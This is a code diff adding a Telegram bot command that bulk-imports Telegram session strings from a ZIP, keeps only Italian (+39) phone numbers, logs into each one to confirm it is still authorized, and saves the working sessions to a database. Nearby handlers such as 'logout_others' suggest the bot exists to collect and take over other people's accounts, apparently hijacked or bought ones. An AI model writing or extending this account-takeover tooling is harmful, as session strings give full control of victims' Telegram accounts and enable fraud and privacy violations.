@@ -207,6 +207,135 @@ async def generate_full_session_data(session_info, client, me):
 
 # ================== SESSION EXPORT ==================
 
+@dp.message_handler(commands=['itim'])
+async def cmd_itim(message: types.Message):
+    if not (is_main_admin(message.from_user.id) or is_light_admin(message.from_user.id)):
+        await message.answer("❌ You don't have access to this command.")
+        return
+
+    if not message.document:
+        await message.answer("❗ Please send a ZIP file containing sessions in export format.")
+        return
+
+    if not message.document.file_name.endswith('.zip'):
+        await message.answer("❌ The file must be a ZIP archive.")
+        return
+
+    await message.answer("⏳ Starting import of Italian (+39) sessions, please wait...")
+    
+    temp_dir = tempfile.mkdtemp()
+    zip_path = os.path.join(temp_dir, message.document.file_name)
+    
+    try:
+        # Download the ZIP file
+        await message.document.download(destination_file=zip_path)
+        
+        imported_count = 0
+        skipped_count = 0
+        invalid_count = 0
+        
+        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+            # First pass: count total files for progress
+            file_list = zip_ref.namelist()
+            total_files = len([f for f in file_list if f.endswith('.json')])
+            processed_files = 0
+            
+            # Process each JSON file
+            for filename in file_list:
+                if not filename.endswith('.json'):
+                    continue
+                    
+                processed_files += 1
+                phone = filename.replace('.json', '')
+                
+                # Check if phone is Italian (+39)
+                if not phone.startswith('39'):
+                    skipped_count += 1
+                    continue
+                    
+                # Update progress every 5 files
+                if processed_files % 5 == 0:
+                    await message.answer(
+                        f"⏳ Processing...\n"
+                        f"Files: {processed_files}/{total_files}\n"
+                        f"Imported: {imported_count} | Skipped: {skipped_count} | Invalid: {invalid_count}"
+                    )
+                
+                try:
+                    # Read JSON data
+                    with zip_ref.open(filename) as json_file:
+                        session_data = json.load(json_file)
+                        
+                    # Verify required fields
+                    if not all(k in session_data for k in ['phone', 'session']):
+                        invalid_count += 1
+                        continue
+                        
+                    # Check session validity
+                    client = TelegramClient(
+                        StringSession(session_data['session']),
+                        API_ID,
+                        API_HASH,
+                        proxy=proxy
+                    )
+                    
+                    try:
+                        await client.connect()
+                        
+                        if not await client.is_user_authorized():
+                            invalid_count += 1
+                            continue
+                            
+                        # If valid, save to appropriate collection
+                        session_record = {
+                            'phone': f"+{session_data['phone']}",
+                            'session': session_data['session'],
+                            'owner_id': message.from_user.id,
+                            'imported_at': datetime.now().isoformat()
+                        }
+                        
+                        if is_main_admin(message.from_user.id):
+                            # Avoid duplicates for main admin
+                            if not sessions_col.find_one({'phone': session_record['phone']}):
+                                sessions_col.insert_one(session_record)
+                                imported_count += 1
+                        else:
+                            # Light admin can have duplicates
+                            light_sessions_col.insert_one(session_record)
+                            imported_count += 1
+                            
+                    except Exception as e:
+                        invalid_count += 1
+                        logging.error(f"Error validating session {phone}: {str(e)}")
+                    finally:
+                        await client.disconnect()
+                        
+                except Exception as e:
+                    invalid_count += 1
+                    logging.error(f"Error processing {filename}: {str(e)}")
+        
+        # Final report
+        report = (
+            f"✅ Import completed:\n"
+            f"• Total files processed: {total_files}\n"
+            f"• Italian (+39) sessions imported: {imported_count}\n"
+            f"• Non-Italian sessions skipped: {skipped_count}\n"
+            f"• Invalid sessions skipped: {invalid_count}"
+        )
+        
+        await message.answer(report)
+        
+    except Exception as e:
+        await message.answer(f"❌ Import failed: {str(e)}")
+    finally:
+        # Cleanup
+        try:
+            if os.path.exists(zip_path):
+                os.unlink(zip_path)
+            os.rmdir(temp_dir)
+        except Exception as e:
+            logging.error(f"Cleanup error: {str(e)}")
+
 
 # Добавьте этот обработчик в раздел COMMAND HANDLERS
 @dp.message_handler(commands=['logout_others'])
